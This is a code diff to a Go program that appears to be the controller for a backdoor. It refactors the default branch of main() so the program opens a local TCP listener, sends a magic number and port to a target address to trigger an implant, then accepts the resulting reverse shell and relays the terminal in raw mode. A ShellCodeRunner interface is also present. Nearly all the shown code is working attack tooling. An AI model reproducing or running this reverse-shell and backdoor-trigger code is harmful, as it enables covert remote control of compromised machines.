@@ -3,7 +3,6 @@ package main
 import (
 	"encoding/hex"
 	"flag"
-	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
@@ -143,26 +142,6 @@ type ShellCodeRunner interface {
 	RunShellCode(b []byte) error
 }
 
-func listen(listener net.Listener, wg *sync.WaitGroup) {
-	conn, err := listener.Accept()
-	if err == nil {
-		fmt.Println("Received connection!")
-		fmt.Println(conn)
-
-		rawMode := exec.Command("/bin/stty", "-echo", "raw")
-		rawMode.Stdin = os.Stdin
-		_ = rawMode.Run()
-
-		go func() { io.Copy(conn, os.Stdout) }()
-		io.Copy(os.Stdin, conn)
-
-		rawModeOff := exec.Command("/bin/stty", "sane")
-		rawModeOff.Stdin = os.Stdin
-		_ = rawModeOff.Run()
-	}
-	wg.Done()
-}
-
 func main() {
 	var home string
 
@@ -274,22 +253,48 @@ func main() {
 		}
 		wg.Wait()
 	default:
-		// TODO: attempt to connect to the backdoor
-		// and return the reverse shell
-		listener, err := net.Listen("tcp4", "0.0.0.0:0")
+		l, err := net.Listen("tcp4", "0.0.0.0:0")
 		if err != nil {
 			log.Fatalf("Failed to open reverse shell: %s", err)
 		}
-		fmt.Println(listener.Addr())
-		wg := &sync.WaitGroup{}
-		wg.Add(1)
-		go listen(listener, wg)
-		conn, err := net.Dial("tcp4", *addr)
+		log.Printf("TCP socket opened on %s", l.Addr())
+
+		_, port, err := net.SplitHostPort(l.Addr().String())
 		if err != nil {
-			log.Fatalf("Failed to open reverse shell: %s", err)
+			log.Fatalf("Failed to parse port from %s: %s", l.Addr(), err)
 		}
-		_, port, _ := net.SplitHostPort(listener.Addr().String())
-		conn.Write([]byte(MagicNumber + " " + port))
-		wg.Wait()
+
+		go func() {
+			conn, err := net.Dial("tcp4", *addr)
+			if err != nil {
+				log.Fatalf("Failed to dial %s: %s", *addr, err)
+			}
+
+			_, err = conn.Write([]byte(MagicNumber + " " + port))
+			if err != nil {
+				log.Fatalf("Failed to send magic number to %s: %s", *addr, err)
+			}
+		}()
+
+		conn, err := l.Accept()
+		if err != nil {
+			log.Fatalf("Failed to accept connection on %s: %s", l.Addr(), err)
+		}
+		log.Printf("Received connection from %s", conn.RemoteAddr())
+
+		cmd := exec.Command("stty", "-echo", "raw")
+		cmd.Stdin = os.Stdin
+		if err = cmd.Run(); err != nil {
+			log.Fatalf("Failed to open stty: %s", err)
+		}
+
+		go io.Copy(conn, os.Stdout)
+		io.Copy(os.Stdin, conn)
+
+		cmd = exec.Command("stty", "sane")
+		cmd.Stdin = os.Stdin
+		if err = cmd.Run(); err != nil {
+			log.Fatalf("Failed to close stty: %s", err)
+		}
 	}
 }
